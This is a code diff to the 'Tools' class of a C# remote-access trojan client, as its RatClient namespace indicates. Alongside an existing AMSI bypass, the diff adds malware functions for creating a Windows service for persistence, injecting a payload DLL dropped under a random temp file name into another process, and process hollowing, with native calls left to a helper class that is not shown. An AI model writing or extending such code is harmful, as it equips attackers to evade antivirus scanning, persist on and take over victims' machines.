@@ -11,6 +11,10 @@ using System.Management;
 using System.Security.Principal;
 using System.Runtime.Serialization.Json;
 using System.Net.Configuration;
+using RatClient.SymetricCrypto;
+using RatClient.AcRSA;
+using System.Text;
+using System.Windows.Forms;
 
 public class Tools
 {
@@ -271,5 +275,51 @@ public class Tools
     public static bool BypassAmsi()
     {
         return NativeMethods.AmsiBypass() == 0;
+    }
+
+    public static bool CreateNewService(string binpath, string serviceName, string serviceDescription)
+    {
+        return NativeMethods.createSrv(binpath, serviceName, serviceDescription) == 0;
+    }
+    
+    public static string GetRandomeFile(string basePath, string type = null) 
+    {
+		string name = $"{Path.GetRandomFileName().Split('.')[0]}";
+        if (type != null)
+        {
+            name += $".{type}";
+		}
+		return Path.Combine(basePath, name);
+	}
+
+    public static bool DllInjection(int pid, byte[] payloadDll)
+    {
+        string path = GetRandomeFile(Path.GetTempPath(),"dll");
+		Console.WriteLine($"creating random file {path}");
+		File.WriteAllBytes(path, payloadDll);
+        return NativeMethods.InjectDll(pid, path) == 0;
+    }
+
+    public static bool ProcessHollowing(string targetPath, byte[] exePayload)
+    {
+        return NativeMethods.HollowProcess(targetPath, exePayload, exePayload.Length) == 0;
+    }
+
+    public static bool Isx64Exe(string exe)
+    {
+        bool result;
+        if (!exe.EndsWith(".exe"))
+        {
+            result = false;
+        }
+        else if (!File.Exists(exe))
+        {
+			result = false;
+		}
+        else
+        {
+            result = NativeMethods.isx64Exe(exe);
+        }
+        return result;
     }
 }
